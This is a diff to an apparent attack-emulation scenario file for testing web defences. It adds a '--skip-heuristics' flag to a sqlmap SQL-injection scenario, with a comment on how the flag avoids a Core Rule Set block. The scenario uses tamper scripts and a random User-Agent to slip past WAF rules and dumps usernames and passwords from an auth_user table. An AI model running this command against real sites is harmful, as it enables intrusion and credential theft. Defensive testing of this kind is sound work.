@@ -76,6 +76,11 @@
 # The same injection with a browser User-Agent and tamper scripts that rewrite
 # spaces, comparison operators and keyword case: a defence that only matches
 # sqlmap's own User-Agent or one spelling of the payload lets this one through.
+# `--skip-heuristics`: the tampered heuristic probe can pass CRS's inbound
+# rules and reach the board, which answers 500; from paranoia level 2 CRS
+# 950100 and 959100 refuse that response after its headers are sent, nginx
+# drops the connection, and sqlmap ended "unable to connect" with one request
+# sent (4 of 10 runs at PL2 on OpenStack, 2026-10-13; 0 of 6 with the flag).
 - name: board-sqli-orderby-sqlmap-tamper
   malicious: true
   stage: initial-compromise
@@ -86,7 +91,7 @@
   tool: sqlmap
   args: ["-u", "{target}/?sort=posts_post.id*",
          "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql",
-         "--random-agent", "--tamper=space2comment,between,randomcase",
+         "--random-agent", "--tamper=space2comment,between,randomcase", "--skip-heuristics",
          "-D", "board", "-T", "auth_user", "-C", "username,password",
          "--dump", "--batch", "--answers=crack=N", "--flush-session"]
 
